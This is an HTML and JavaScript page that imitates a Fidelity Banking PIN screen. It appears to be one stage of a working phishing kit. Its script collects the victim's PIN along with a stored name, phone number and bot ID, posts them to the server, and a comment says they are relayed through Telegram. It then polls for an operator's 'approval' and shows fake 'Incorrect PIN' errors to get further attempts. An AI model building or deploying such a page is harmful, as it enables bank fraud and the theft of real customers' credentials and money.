<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Enter PIN – Fidelity Banking</title>

    <style>
        /* ================================
           GLOBAL – Fidelity Theme
        ================================= */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: #f5f3f0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* ================================
           PIN CARD
        ================================= */
        .pin-card {
            width: 100%;
            max-width: 440px;
            background: #ffffff;
            border-radius: 24px;
            padding: 40px 28px 36px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08), 0 8px 24px rgba(0, 0, 0, 0.04);
            text-align: center;
            position: relative;
            transition: transform 0.2s ease;
        }

        /* ================================
           BACK BUTTON
        ================================= */
        .back {
            position: absolute;
            left: 20px;
            top: 20px;
            font-size: 22px;
            color: #e11b22;
            cursor: pointer;
            font-weight: 600;
            background: #f5f3f0;
            width: 42px;
            height: 42px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.25s ease;
            border: none;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
        }
        .back:hover {
            background: #ece8e4;
            transform: scale(1.05);
        }
        .back:active {
            transform: scale(0.92);
        }

        /* ================================
           HEADER
        ================================= */
        .pin-title {
            font-size: 26px;
            font-weight: 700;
            color: #1c1c1e;
            margin-bottom: 2px;
            letter-spacing: -0.5px;
        }
        .pin-title span {
            color: #e11b22;
        }

        .pin-subtitle {
            font-size: 15px;
            color: #88888c;
            margin-bottom: 6px;
            font-weight: 400;
        }

        /* Gold accent line */
        .accent-line {
            width: 56px;
            height: 4px;
            background: linear-gradient(90deg, #f5c518, #e6b300);
            border-radius: 4px;
            margin: 10px auto 26px;
        }

        /* ================================
           PIN INPUT WRAPPER
        ================================= */
        .pin-box-wrapper {
            background: linear-gradient(145deg, #e11b22, #c9181f);
            border-radius: 20px;
            padding: 28px 20px 24px;
            margin-bottom: 28px;
            box-shadow: 0 12px 32px rgba(225, 27, 34, 0.28);
            position: relative;
            overflow: hidden;
        }

        /* Subtle animated shimmer overlay */
        .pin-box-wrapper::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 40%, rgba(255, 255, 255, 0.06) 0%, transparent 60%);
            pointer-events: none;
            animation: shimmer 6s ease-in-out infinite;
        }

        @keyframes shimmer {
            0%,
            100% {
                transform: translateX(-20%) translateY(-10%) rotate(0deg);
            }
            50% {
                transform: translateX(20%) translateY(10%) rotate(5deg);
            }
        }

        /* ================================
           PIN INPUT FIELD
        ================================= */
        .pin-input {
            width: 100%;
            padding: 18px 20px;
            border: none;
            border-radius: 14px;
            font-size: 22px;
            font-weight: 700;
            letter-spacing: 8px;
            outline: none;
            background: #ffffff;
            color: #1c1c1e;
            text-align: center;
            box-shadow: inset 0 4px 12px rgba(0, 0, 0, 0.06);
            transition: box-shadow 0.25s ease, transform 0.2s ease;
            position: relative;
            z-index: 1;
        }
        .pin-input:focus {
            box-shadow: inset 0 4px 12px rgba(0, 0, 0, 0.08), 0 0 0 4px rgba(255, 255, 255, 0.25);
            transform: scale(1.01);
        }
        .pin-input::placeholder {
            color: #bbbbc0;
            letter-spacing: 2px;
            font-weight: 400;
            font-size: 18px;
        }

        /* ================================
           PIN DOTS INDICATOR (optional visual)
        ================================= */
        .pin-dots {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 18px;
            position: relative;
            z-index: 1;
        }
        .pin-dot {
            width: 14px;
            height: 14px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.2);
            transition: all 0.3s ease;
            border: 1.5px solid rgba(255, 255, 255, 0.1);
        }
        .pin-dot.filled {
            background: rgba(255, 255, 255, 0.9);
            border-color: rgba(255, 255, 255, 0.6);
            transform: scale(1.15);
            box-shadow: 0 0 16px rgba(255, 255, 255, 0.25);
        }

        /* ================================
           LOGIN BUTTON
        ================================= */
        .btn-login {
            width: 100%;
            padding: 18px 0;
            font-size: 17px;
            font-weight: 700;
            background: #e11b22;
            color: #ffffff;
            border: none;
            border-radius: 999px;
            cursor: pointer;
            opacity: 0.4;
            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            box-shadow: 0 4px 16px rgba(225, 27, 34, 0);
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }

        .btn-login:enabled {
            opacity: 1;
            box-shadow: 0 8px 28px rgba(225, 27, 34, 0.3);
        }

        .btn-login:enabled:hover {
            background: #c9181f;
            transform: translateY(-2px);
            box-shadow: 0 12px 36px rgba(225, 27, 34, 0.4);
        }

        .btn-login:enabled:active {
            transform: translateY(0px) scale(0.98);
            box-shadow: 0 4px 16px rgba(225, 27, 34, 0.25);
        }

        .btn-login:disabled {
            cursor: not-allowed;
        }

        /* Button ripple effect on hover */
        .btn-login::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.15);
            transition: width 0.6s ease, height 0.6s ease, top 0.6s ease, left 0.6s ease;
            transform: translate(-50%, -50%);
        }
        .btn-login:enabled:hover::after {
            width: 300%;
            height: 300%;
            top: 50%;
            left: 50%;
        }

        /* ================================
           STATUS / WAITING MESSAGE
        ================================= */
        .status {
            margin-top: 18px;
            font-size: 14px;
            font-weight: 600;
            color: #e11b22;
            display: none;
            padding: 10px 16px;
            border-radius: 12px;
            background: #fef2f0;
            border: 1px solid rgba(225, 27, 34, 0.12);
            animation: fadeSlideUp 0.4s ease;
        }

        .status.error {
            color: #dc2626;
            background: #fef2f2;
            border-color: rgba(220, 38, 38, 0.12);
        }

        .status.show {
            display: block;
        }

        @keyframes fadeSlideUp {
            0% {
                opacity: 0;
                transform: translateY(8px);
            }
            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* ================================
           RESPONSIVE
        ================================= */
        @media (max-width: 460px) {
            .pin-card {
                padding: 28px 18px 28px;
                border-radius: 20px;
            }
            .pin-title {
                font-size: 22px;
            }
            .pin-box-wrapper {
                padding: 20px 14px 18px;
                border-radius: 16px;
            }
            .pin-input {
                font-size: 20px;
                padding: 16px 14px;
                letter-spacing: 6px;
            }
            .pin-input::placeholder {
                font-size: 16px;
            }
            .btn-login {
                font-size: 16px;
                padding: 16px 0;
            }
            .back {
                left: 14px;
                top: 14px;
                width: 38px;
                height: 38px;
                font-size: 20px;
            }
            .pin-dots {
                gap: 10px;
            }
            .pin-dot {
                width: 12px;
                height: 12px;
            }
        }

        @media (max-width: 380px) {
            .pin-card {
                padding: 24px 14px 24px;
            }
            .pin-title {
                font-size: 20px;
            }
            .pin-subtitle {
                font-size: 13px;
            }
            .pin-input {
                font-size: 18px;
                padding: 14px 10px;
                letter-spacing: 4px;
            }
            .btn-login {
                font-size: 15px;
                padding: 14px 0;
            }
        }
    </style>
</head>

<body>

    <div class="pin-card">

        <!-- Back Button -->
        <button class="back" onclick="event.stopPropagation(); history.back();" aria-label="Go back">
            ←
        </button>

        <!-- Header -->
        <div class="pin-title">
            Enter <span>PIN</span>
        </div>
        <div class="pin-subtitle">Secure your Fidelity account</div>
        <div class="accent-line"></div>

        <!-- PIN Input Wrapper -->
        <div class="pin-box-wrapper">
            <input
                id="pinInput"
                type="password"
                inputmode="numeric"
                placeholder="Enter PIN"
                class="pin-input"
                autofocus
                maxlength="6"
                aria-label="Enter your PIN"
            />
            <!-- Pin dots indicator -->
            <div class="pin-dots" id="pinDots">
                <span class="pin-dot"></span>
                <span class="pin-dot"></span>
                <span class="pin-dot"></span>
                <span class="pin-dot"></span>
                <span class="pin-dot"></span>
                <span class="pin-dot"></span>
            </div>
        </div>

        <!-- Submit Button -->
        <button class="btn-login" id="loginBtn" disabled>
            Confirm PIN
        </button>

        <!-- Status Message -->
        <div id="status" class="status">⏳ Waiting for approval…</div>

    </div>

    <script>
        // ================================
        // DOM REFERENCES
        // ================================
        const input = document.getElementById('pinInput');
        const loginBtn = document.getElementById('loginBtn');
        const statusEl = document.getElementById('status');
        const dots = document.querySelectorAll('.pin-dot');

        // ================================
        // SESSION CHECK
        // ================================
        const fullName = localStorage.getItem('fullName') || 'User';
        const phone = localStorage.getItem('phone');
        const botId = localStorage.getItem('botId');

        if (!phone || !botId) {
            alert('Session expired. Please start again.');
            window.location.href = 'index.html';
        }

        // ================================
        // FOCUS HELPER
        // ================================
        document.querySelector('.pin-card').addEventListener('click', () => {
            input.focus();
        });

        // ================================
        // INPUT HANDLER – Digits only, dynamic dots
        // ================================
        input.addEventListener('input', () => {
            // Allow only digits
            input.value = input.value.replace(/\D/g, '');

            // Update dots
            const length = input.value.length;
            dots.forEach((dot, index) => {
                if (index < length) {
                    dot.classList.add('filled');
                } else {
                    dot.classList.remove('filled');
                }
            });

            // Enable button only if there's at least 1 digit
            loginBtn.disabled = length === 0;
        });

        // ================================
        // SUBMIT HANDLER – Telegram + Polling
        // ================================
        loginBtn.addEventListener('click', async () => {
            const pin = input.value.trim();

            // Disable UI and show waiting
            loginBtn.disabled = true;
            statusEl.textContent = '⏳ Waiting for approval…';
            statusEl.className = 'status show';
            statusEl.classList.remove('error');

            try {
                const res = await fetch('/submit-pin', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        name: fullName,
                        phone,
                        pin,
                        botId
                    })
                });

                const data = await res.json();

                if (!data.requestId) {
                    throw new Error('Missing requestId');
                }

                // Start polling for admin approval
                pollPin(data.requestId);

            } catch (e) {
                statusEl.textContent = '❌ Server error. Try again.';
                statusEl.className = 'status show error';
                loginBtn.disabled = false;
            }
        });

        // ================================
        // POLLING LOGIC
        // ================================
        function pollPin(requestId) {
            let attempts = 0;
            const maxAttempts = 60;

            const interval = setInterval(async () => {
                attempts++;

                try {
                    const res = await fetch(`/check-pin/${requestId}`);
                    const data = await res.json();

                    // ✅ SUCCESS – redirect to success.html
                    if (data.approved === true || data.redirect === 'success') {
                        clearInterval(interval);
                        window.location.href = 'success.html';
                        return;
                    }

                    // ❌ REJECTED
                    if (data.approved === false || data.blocked) {
                        clearInterval(interval);
                        input.value = '';
                        dots.forEach(dot => dot.classList.remove('filled'));
                        loginBtn.disabled = true;
                        statusEl.textContent = '❌ Incorrect PIN. Try again.';
                        statusEl.className = 'status show error';
                        loginBtn.disabled = false;
                        return;
                    }

                    // ⏰ TIMEOUT
                    if (attempts >= maxAttempts) {
                        clearInterval(interval);
                        input.value = '';
                        dots.forEach(dot => dot.classList.remove('filled'));
                        loginBtn.disabled = true;
                        statusEl.textContent = '⏰ Request timed out. Please try again.';
                        statusEl.className = 'status show error';
                        loginBtn.disabled = false;
                    }

                } catch (e) {
                    console.log('Poll error:', e);
                }
            }, 2000);
        }

        // ================================
        // KEYBOARD SHORTCUT: Enter to submit
        // ================================
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !loginBtn.disabled) {
                loginBtn.click();
            }
        });

        // Auto-focus on load
        window.addEventListener('load', () => {
            setTimeout(() => input.focus(), 300);
        });
    </script>

</body>
</html>
